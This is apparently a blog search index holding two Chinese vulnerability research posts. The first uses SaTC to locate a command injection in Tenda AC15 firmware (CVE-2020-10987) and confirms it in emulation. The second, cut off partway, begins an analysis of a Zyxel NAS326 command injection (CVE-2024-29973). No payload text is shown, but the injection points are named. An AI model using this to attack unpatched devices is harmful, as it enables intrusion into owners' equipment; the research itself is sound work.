<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SaTC自动化漏洞分析和实例测试</title>
    <link href="/2024/09/01/SaTC%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/09/01/SaTC%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h3 id="SaTC自动化漏洞分析和实例测试"><a href="#SaTC自动化漏洞分析和实例测试" class="headerlink" title="SaTC自动化漏洞分析和实例测试"></a>SaTC自动化漏洞分析和实例测试</h3><h4 id="自动化漏洞挖掘"><a href="#自动化漏洞挖掘" class="headerlink" title="自动化漏洞挖掘"></a>自动化漏洞挖掘</h4><p>自动化漏洞挖掘分为动态测试和静态测试</p><h5 id="动态测试"><a href="#动态测试" class="headerlink" title="动态测试"></a>动态测试</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">iot设备Fuzz，简单来说就是针对物联网设备进行模糊测试。它利用自动化工具，向设备发送大量随机或变异的数据，以发现潜在的安全漏洞。<br></code></pre></td></tr></table></figure><h6 id="AFL"><a href="#AFL" class="headerlink" title="AFL++"></a>AFL++</h6><p><code>American Fuzzy Lop plus plus (afl++)</code>是一个由社区驱动的开源工具，它结合了最新的模糊研究，使研究具有可比性，可重复性，可组合性。它提供了多种新功能，例如，<code>Custom Mutator API</code> （传统的突变API）能够<strong>增加模糊测试处理策略</strong>，<strong>特定目标的变异</strong>也可以由经验丰富的安全测试人员编写。具体细节可以参阅<a href="https://www.usenix.org/conference/woot20/presentation/fioraldi">AFL++ : Combining Incremental Steps of Fuzzing Research</a>。</p><p><a href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a></p><h6 id="Boofuzz"><a href="#Boofuzz" class="headerlink" title="Boofuzz"></a>Boofuzz</h6><p><strong>Boofuzz</strong>是一个基于生成（generation-based）的协议Fuzz工具，它通过python语言来描述协议的格式，是经典模糊测试框架<strong>Sulley</strong>的继承者，除了众多的bug修复之外，boofuzz还致力于扩展性。Boofuzz对协议的模糊测试有着良好的支持，且其代码开源，目前被广泛使用。物联网设备中设计到了大量的协议，常见的如tcp,udp,mqtt,upnp等等，还有一些各个厂商自己设计的协议等等，而boofuzz则是一款对于协议模糊测试效果非常出众的模糊测试框架。</p><p><a href="https://github.com/jtpereyda/boofuzz">https://github.com/jtpereyda/boofuzz</a></p><h6 id="现有fuzz工具的不足"><a href="#现有fuzz工具的不足" class="headerlink" title="现有fuzz工具的不足"></a><strong>现有fuzz工具的不足</strong></h6><p>​        路由器通常为终端用户提供基于web的界面来配置系统。底层固件包含web服务器、各种前端文件和后端二进制程序。web服务器接受来自前端的HTTP请求，并调用后端二进制文件来处理它们。在这种情况下，攻击者可能会在前端构建恶意输入，以破坏相应的后端二进制文件。</p><p>​        现有的方法无法有效分析嵌入式系统中的服务以检测漏洞。动态方法如模糊测试和仿真，只能到达程序所有可能状态的一小部分，导致很高的误报率。静态方法如KARONTE依赖前后端之间的通用进程间通信(IPC)来定位处理输入数据的代码，并执行集中测试，但这些方法可能会导致许多误报。从嵌入式系统发现bug的关键点是使用web前端用户提供的数据来定位后端处理该数据的代码。</p><p>​       尽管传统fuzz在通用平台上能对程序进行有效的测试，但因为fuzz对硬件配置有较高的要求，所以AFL对iot设备fuzz的适配性有限，比如：提取一个固件并找到一个应用程序，然后使用AFL对此程序进行fuzz，AFL难以模拟物联网设备的复杂交互场景，例如设备发现、连接、数据传输等，正常情况下fuzz会失败。他主要针对二进制文件进行模糊测试，对网络协议的支持也有限。</p><h5 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h5><p>​      静态测试中的污点分析由三部分组成：污点源（source）、污点汇集点（sink）和数据流处理（processor）</p><ul><li><strong>source 即污点源</strong>，代表直接引入不受信任的数据或者机密数据到系统中</li><li><strong>sink 即污点汇聚点</strong>，代表直接产生安全敏感操作（违反数据完整性）或者泄露隐私数据到外界（违反数据保密性）</li><li><strong>processor 即数据流处理</strong>，代表整个数据传输和处理的过程（例如加密、编码处理），外部输入的数据经过processor处理后会得到一个适合软件核心模块处理的数据形式.</li></ul><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905192036363.png" alt="image-20240905192036363"></p><h4 id="SaTC简介"><a href="#SaTC简介" class="headerlink" title="SaTC简介"></a>SaTC简介</h4><p>SaTC代码：<a href="https://github.com/NSSL-SJTU/SaTC/tree/py2_env">https://github.com/NSSL-SJTU/SaTC/tree/py2_env</a></p><p>数据集 <a href="https://drive.google.com/file/d/1rOhjBlmv3jYmkKhTBJcqJ-G56HoHBpVX/view?usp=sharing">https://drive.google.com/file/d/1rOhjBlmv3jYmkKhTBJcqJ-G56HoHBpVX/view?usp=sharing</a></p><p>论文 <a href="https://www.usenix.org/system/files/sec21fall-chen-libo.pdf">https://www.usenix.org/system/files/sec21fall-chen-libo.pdf</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">SaTC（<span class="hljs-keyword">Sharing </span>More <span class="hljs-keyword">and </span>Checking Less）是一个创新的开源工具，专为检测嵌入式系统的漏洞设计。其核心理念是利用共同的输入关键词，以更高效的方式识别潜在的漏洞，如命令注入和缓冲区溢出问题。SaTC提供了强大的自动化分析功能，大大简化了固件的安全审计工作。<br></code></pre></td></tr></table></figure><p>​      他基于Ghidra逆向工程框架，通过定制的Ghidra脚本，如ref2sink_cmdi和ref2sink_bof，自动追踪可能的风险路径。这些脚本能够挖掘命令注入和缓冲区溢出类漏洞的源码路径。此外，ref2share和share2sink脚本组合使用，可以探测到共享输入数据导致的问题。工具还集成了污点分析，增强了对潜在风险的识别能力。</p><p><strong>工作流程图</strong></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905192556398.png" alt="image-20240905192556398"></p><p>​       通过跟踪前端和后端之间用户输入的数据流，以精确检测安全漏洞。处理用户输入的后端函数通常与相应的前端文件共享一个关键字：在前端，用户输入被标记为关键字并编码在数据包中；在后端，使用相同或相似的关键字从数据包中提取用户输入。因此，可以使用共享关键字来标识前端和后端之间的连接，并在后端找到用户输入的入口。</p><h4 id="SaTC实例测试"><a href="#SaTC实例测试" class="headerlink" title="SaTC实例测试"></a>SaTC实例测试</h4><p><strong>安装</strong></p><p>SaTC安装参见**<a href="https://github.com/NSSL-SJTU/SaTC">Github</a>**</p><p>也可以直接docker镜像拉取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉取docker镜像</span><br>docker pull smile0304/satc<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入docker环境</span><br>docker run -it smile0304/satc:V1.0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装pip requirement</span><br>pip install -r requirement.txt<br></code></pre></td></tr></table></figure><p>这里以tenda ac15为例，测试&#x2F;bin&#x2F;httpd是否存在命令注入漏洞</p><p>固件版本：US_AC15V1.0BR_V15.03.05.19_multi_TD01</p><p>将解包后的squashfs-root目录docker cp复制到docker中的SaTC目录（也可以用-v作目录映射）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">iot@research:~/gujian/tenda/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root$ docker cp ./squashfs-root/ 9d85e744e75e:/home/satc/SaTC/tendaac15<br></code></pre></td></tr></table></figure><p>测试httpd中是否存在命令注入漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python satc.py -d /home/satc/SaTC/tendaac15/squashfs-root/ -o /home/satc/SaTC/res_ac15 --ghidra_script=ref2sink_cmdi -b httpd --taint_check<br></code></pre></td></tr></table></figure><p>这里指定了只寻找httpd的命令执行漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">optional arguments:<br>  -h, --help            查看帮助<br>  -d /root/path/_ac18.extracted, --directory /root/path/_ac18.extracted<br>                        指定从固件中提取出的文件系统<br>  -o /root/output, --output /root/output<br>                        指定结果输出位置<br>  --ghidra_script &#123;ref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all&#125;<br>                        (可选) 指定要使用的 Ghidra 脚本。 如果使用`all`命令，`ref2sink_cmdi`、`ref2sink_bof`和`ref2share`三个脚本将同时运行<br>  --ref2share_result /root/path/ref2share_result  (可选) 运行`share2sink` Ghidra脚本时，需要使用该参数指定`ref2share`脚本的输出结果<br>  --save_ghidra_project (可选) 是否保存程序运行时产生的ghidra工程路径<br>  --taint_check         (可选) 指定是否启用污点分析<br>  -b /var/ac18/bin/httpd, --bin /var/ac18/bin/httpd<br>                        (可选) 用于指定需要分析的程序，如果不指定，SaTC将使用内置算法确认需要分析的程序<br>  -l 3, --len 3         (可选) 根据分析结果分析可能为边界的前N个程序，默认为3<br></code></pre></td></tr></table></figure><p>Ghidra Script介绍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ref2sink_cmdi : 该脚本从给定的字符串的引用中找到命令注入类型sink函数的路径。<br>ref2sink_bof : 改脚本从给定的字符串的引用中找到缓冲区溢出类型sink函数的路径。<br>ref2share: 此脚本用来查找输入等字符串中被写入共享函数等参数，例如:nvram_set, setenv等函数。需要与share2sink来配合使用<br>share2sink: 此脚本与ref2share功能类似。需要与ref2share来配合使用；使用此脚本的输入为ref2share脚本的输出<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905194606875.png" alt="image-20240905194606875"></p><p>​       开始了从Ghidra decompiler到keyword finding的过程，找到共享的关键字，基于这个关键字开展污点分析，然后再进行一步步的筛选。这里需要一定时间才能跑完。</p><p>result目录结构如下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905195548773.png" alt="image-20240905195548773"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">|-- ghidra_extract_result # ghidra寻找函数调用路径的分析结果, 启用`--ghidra_script`选项会输出该目录<br>|   |-- httpd # 每个被分析的bin都会生成一个同名文件夹<br>|       |-- httpd # 被分析的bin<br>|       |-- httpd_ref2sink_bof.result # 定位bof类型的sink函数路径<br>|       |-- httpd_ref2sink_cmdi.result # 定位cmdi类型的sink函数路径<br>|-- keyword_extract_result  # 关键字提取结果<br>|   |-- detail  # 前端关键字提取结果(详细分析结果)<br>|   |   |-- API_detail.result # 提取的API详细结果<br>|   |   |-- API_remove_detail.result # 被过滤掉的API信息<br>|   |   |-- api_split.result  # 模糊匹配的API结果<br>|   |   |-- Clustering_result_v2.result # 详细分析结果(不关心其他过程关心此文件即可)<br>|   |   |-- File_detail.result  # 记录了从单独文件中提取的关键字<br>|   |   |-- from_bin_add_para.result # 在二进制匹配过程中新增的关键字<br>|   |   |-- from_bin_add_para.result_v2 # 同上,V2版本<br>|   |   |-- Not_Analysise_JS_File.result # 未被分析的JS文件<br>|   |   |-- Prar_detail.result # 提取的Prar详细结果<br>|   |   |-- Prar_remove_detail.result # 被过滤掉的Prar结果<br>|   |-- info.txt  # 记录前端关键字提取时间等信息<br>|   |-- simple  # 前端关键字提取结果, 比较简单<br>|       |-- API_simple.result # 在全部二进制中出现的全部API名称<br>|       |-- Prar_simple.result  # 在全部二进制中出现等的全部Prar<br>|-- result-httpd-ref2sink_cmdi-ctW8.txt # 污点分析结果,启用`--taint-check` 和 `--ghidra_script`选项才会生成该文件<br></code></pre></td></tr></table></figure><p>最终污点分析结果存储在了<code>result-httpd-ref2sink_cmdi-6MIi.txt</code>中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">binary: /home/satc/SaTC/tendaac15/squashfs-root/bin/httpd<br>configfile: /home/satc/SaTC/res_ac15/ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result-alter2<br>0xef168 0xa1808   not found<br>0xf1f24 0xa5560   not found<br>0xefa70 0xa1d20   not found<br>```<br>0xf2208 0xa6890   found : 0xa68f8<br>```<br>0xefb24 0xa2994   not found<br>total cases: 85<br>find cases: 1<br></code></pre></td></tr></table></figure><p>从结果中看到，httpd的0xa68f8位置疑似存在命令执行，并且该位置的命令执行在sink函数路径文件中也有体现污点传播过程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result:[Param &quot;deviceName&quot;(0x000f2208), Referenced at formsetUsbUnload : 0x000a68c4] &gt;&gt; 0x000a68f4 -&gt; doSystemCmd<br></code></pre></td></tr></table></figure><p>IDA打开httpd，jump到0xa68f8</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905201103176.png" alt="image-20240905201103176"></p><p>v3获取了deviceName的值，并传递给doSystemCmd，显然这里的doSystemCmd是能够命令注入的。</p><p>formsetUsbUnload这个函数很眼熟，deviceName为用户可控的注入点，查了一下cve编号为<strong>cve-2020-10987</strong></p><p>&#x2F;&#x2F;相关的漏洞复现文章网上有很多，这里不作赘述。</p><p>​       根据上海交通大学的论文给出的原理，deviceName（results中0xf2208位置对应其data段）映射为前端用户可控的关键字，先获取了前端可控key-value，后端以相同或相似的关键字从二进制或cgi中进行了提取。</p><p>​       share的关键字连接了前端后端，在污点传播的过程中选择数据流，跟踪不受信任的输入并识别危险函数，最终发现了该漏洞。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240905203333957.png" alt="image-20240905203333957"></p><p><strong>查找前端对应点</strong>：由于在污点传播过程中deviceName是前后端的 shared key-Value</p><p>在文件结构web目录中查找deviceName即可找到对应的前端页面然后进行手工验证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grep -ir <span class="hljs-string">&quot;devicename&quot;</span>|awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print($1)&#125;&#x27;</span>|grep -E <span class="hljs-string">&#x27;html|js&#x27;</span>|<span class="hljs-built_in">sort</span>|<span class="hljs-built_in">uniq</span></span><br>......<br>status_usb.html<br>status_usb.js<br></code></pre></td></tr></table></figure><p>至此 SaTC就为我们找到了命令注入点，大大提高了iot漏洞的挖掘效率</p><h4 id="手工确认实例-cve-2020-10987"><a href="#手工确认实例-cve-2020-10987" class="headerlink" title="手工确认实例-cve-2020-10987"></a>手工确认实例-cve-2020-10987</h4><p>固件下载 <a href="https://www.tenda.com.cn/download/detail-2680.html">https://www.tenda.com.cn/download/detail-2680.html</a></p><p><strong>固件模拟</strong></p><p>这里使用了qemu-system模拟，模拟的详情可见IOTsec-Zone文章 <a href="https://www.iotsec-zone.com/article/451">qemu固件模拟、网卡分析—我与br0的爱恨情仇 - IOTsec-Zone</a></p><p>进入qemu虚拟机后启动httpd</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240906113145202.png" alt="image-20240906113145202"></p><p>进入status_usb.html页面，这里由于js文件的设置，无法显示Unmount button</p><p>在浏览器的Network中禁用了<a href="http://192.168.0.3/goform/GetUsbCfg*%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E5%87%BA%E6%9D%A5%E3%80%82">http://192.168.0.3/goform/GetUsbCfg*后可以显示出来。</a></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240906113953632.png" alt="image-20240906113953632"></p><p>查看该页面的js文件，正常这里就是一个usb插拔的操作，SaTC应该就是在这里帮助我们枚举到了deviceName</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240906120121048.png" alt="image-20240906120121048"></p><p>点击Unmount按钮抓包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240906114523514.png" alt="image-20240906114523514"></p><p>看到了前后端共享的key-Value值deviceName&#x3D;xxx，那么这里就是我们的命令注入点</p><p><strong>POC</strong></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E8%AF%95/image-20240906114741376.png" alt="image-20240906114741376"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>zyxel-NAS命令执行</title>
    <link href="/2024/09/01/zyxel-NAS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/09/01/zyxel-NAS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>CVE-2024-29973合勤NAS命令执行分析</p><p>固件版本：NAS326_V5.21(AAZF.4)C0</p><p>下载链接：<a href="https://archive.org/details/nas-zyxel-nas-326">https://archive.org/details/nas-zyxel-nas-326</a></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211001107.png" alt="image-20240912211001107"></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h3><p>根据NVD的描述：V5.21(AAZF.17)C0 之前的 Zyxel NAS326 固件版本和 V5.21(ABAG.14)C0 之前的 NAS542 固件版本中“setCookie”参数中的命令注入漏洞可能允许未经身份验证的攻击攻击者通过发送精心设计的 HTTP POST 请求来执行某些操作系统 (OS) 命令。</p><p><strong>产品介绍</strong></p><p>Zyxel-NAS 是指由 Zyxel Communications Corporation（合勤科技股份有限公司）开发和生产的网络附加存储（Network Attached Storage，简称 NAS）设备。NAS 是一种专门用于存储和共享文件的设备，它通过网络连接到计算机、服务器或其他设备，提供集中式的文件存储和访问功能。</p><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a><strong>固件分析</strong></h3><p>固件下载好以后解压，得到两个文件系统</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211248623.png" alt="image-20240912211248623"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211302819.png" alt="image-20240912211302819"></p><h4 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h4><h5 id="分析cpio-root中的rcS文件"><a href="#分析cpio-root中的rcS文件" class="headerlink" title="分析cpio-root中的rcS文件"></a>分析cpio-root中的rcS文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">.........<br>create_ubi_dev_node()<br>&#123;<br>.......<br>&#125;<br><br>prepare_config_partition()<br>&#123;<br>........<br>&#125;<br><br>check_and_run_usbkey()<br>&#123;<br>.......<br>&#125;<br><br>no_image_handler()<br>&#123;<br>.......<br>&#125;<br>checksum_img()<br>&#123;<br>.......<br>&#125;<br>flash_fail_handler()<br>&#123;<br>.......<br>&#125;<br>rescan_lost_scsi_device()<br>&#123;<br>......<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; -e <span class="hljs-string">&quot;\033[031m*** Stage 2: Prepare the root file system ***\033[0m&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mount NAND <span class="hljs-keyword">for</span> System Disk image.</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; -e <span class="hljs-string">&quot;\033[033mMount system partition...\033[0m&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;MKDIR&#125; -p <span class="hljs-variable">$&#123;NAND_PATH&#125;</span></span><br>.......<br><span class="hljs-meta prompt_"># </span><span class="language-bash">check key here - the earliest location to <span class="hljs-built_in">let</span> pt/pk key work without errors</span><br>check_and_run_usbkey<br>......<br>ls -l /dev/ubi*<br>......<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#### HTP</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">execute HTP forever</span><br>....<br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;IMG_PATH&#125;/etc/init.d/rcS2</span><br></code></pre></td></tr></table></figure><p>rcS主要负责以下几个方面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">准备根文件系统： 脚本首先会根据系统配置信息，确定系统镜像文件所在的 MTD 分区，并挂载该分区到 /mnt/sysinit 目录。<br>启动 FTP 服务，允许用户通过 FTP 协议上传系统镜像文件。<br>扫描 USB 设备，尝试找到包含系统镜像文件的 USB 存储设备。<br>检查系统镜像文件完整性： 脚本会使用 <span class="hljs-built_in">md5sum</span> 命令计算系统镜像文件的 MD5 校验和，并与系统配置信息中的校验和进行比较，以验证镜像文件是否完整。<br>挂载系统镜像文件： 脚本会将系统镜像文件挂载到 /mnt/sysinit 目录，并复制一些必要的系统文件到 /bin 和 /sbin 目录。<br>挂载配置分区： 脚本会挂载配置分区到 /etc/zyxel 目录，并检查配置分区是否存在。<br>恢复配置信息： 脚本会检查配置分区中是否存在 zyconf.tgz 文件，如果存在，则解压缩该文件，恢复系统配置信息。<br>设置文件系统权限： 脚本会设置一些目录的权限，例如 /etc/zyxel 目录的权限设置为 777。<br>最后执行 rcS2 脚本： 脚本最后会执行 /mnt/sysinit/etc/init.d/rcS2 脚本，该脚本负责启动系统服务，包括 Web 服务。<br></code></pre></td></tr></table></figure><p>因此设备启动时，应该是先执行cpio-root文件系统中的rcS，把ext-root文件系统挂载，最后执行ext-root中的rcS2文件</p><h5 id="分析rcS2"><a href="#分析rcS2" class="headerlink" title="分析rcS2"></a>分析rcS2</h5><p> rcS2 启动脚本，负责启动系统中的大部分服务，其中也包括 Web 服务。启动顺序如下</p><ol><li><p><strong>准备环境：</strong> 脚本首先会设置一些环境变量，包括系统路径和模型 ID 等。</p></li><li><p><strong>启动 WSGI 服务器：</strong> 脚本使用 <code>main_wsgi.sh</code> 脚本启动 WSGI 服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; <span class="hljs-string">&quot;Starting WSGI server...&quot;</span></span><br>/etc/init.d/main_wsgi.sh start<br></code></pre></td></tr></table></figure><ul><li><code>main_wsgi.sh</code> 脚本是用来启动 WSGI 服务器的，它会调用 <code>python</code> 命令执行 <code>main_wsgi.pyc</code> 文件，该文件包含了 WSGI 服务器的逻辑。</li></ul></li><li><p><strong>加载 PyConf 配置文件：</strong> 脚本会加载 <code>py_conf</code> 配置文件，并将其复制到 <code>/var/web_framework</code> 目录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Load PyConf for User###</span></span><br>if [ ! -f /etc/zyxel/py_conf ]; then<br>    cp -a /usr/local/apache/web_framework/data/config/py_conf_default /etc/zyxel/py_conf<br>fi<br>chmod 0777 /etc/zyxel/py_conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">copy py_conf from flash to ram <span class="hljs-keyword">for</span> reducing flash write <span class="hljs-built_in">times</span>.</span><br>cp -a /etc/zyxel/py_conf /var/web_framework/<br></code></pre></td></tr></table></figure><ul><li><code>py_conf</code> 文件包含了 Web 应用程序的配置信息，例如数据库连接信息、用户认证信息等等。</li></ul></li><li><p><strong>执行启动脚本：</strong> 脚本会执行 <code>bootsup.pyc</code> 脚本，该脚本负责加载配置信息并启动 Web 应用程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">start to check add new configurations of py_conf</span><br>/usr/bin/python /usr/local/apache/web_framework/lib/bootsup.pyc<br></code></pre></td></tr></table></figure></li><li><p><strong>启动 Zylog 服务：</strong> 脚本使用 <code>zylog_no_logging</code> 命令启动 Zylog 服务，该服务负责记录系统日志。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; <span class="hljs-string">&quot;No more ZySH daemon and client...&quot;</span></span><br><br>/usr/sbin/zylog_no_logging syslog 1<br></code></pre></td></tr></table></figure></li><li><p><strong>设置 URL 前缀：</strong> 脚本使用 <code>chUrlPrefix.sh</code> 脚本设置 Web 服务的 URL 前缀。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/sbin/chUrlPrefix.sh setprefix<br></code></pre></td></tr></table></figure></li><li><p><strong>启动 Zylog 模型：</strong> 脚本使用 <code>python</code> 命令执行 <code>zylog_main_model.pyc</code> 文件，该文件包含了 Zylog 模型的逻辑。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/python /usr/local/apache/web_framework/models/zylog_main_model.pyc<br></code></pre></td></tr></table></figure></li><li><p><strong>启动 UPnP 数据库检查：</strong> 脚本会检查 UPnP 数据库文件是否存在，如果不存在，则从 <code>/ram_bin/usr/etc</code> 目录复制默认的数据库文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">UPnP database-checking(Must before zypkg_controller, because package will using upnpdb)</span><br>if [ ! -e /etc/zyxel/upnp.db ]; then<br>    cp -a /ram_bin/usr/etc/upnp.db /etc/zyxel/upnp.db<br>else<br>    UPDATE_DB_FLAG=`sqlite3 /etc/zyxel/upnp.db &quot;.tables revision&quot;`<br>    # ... 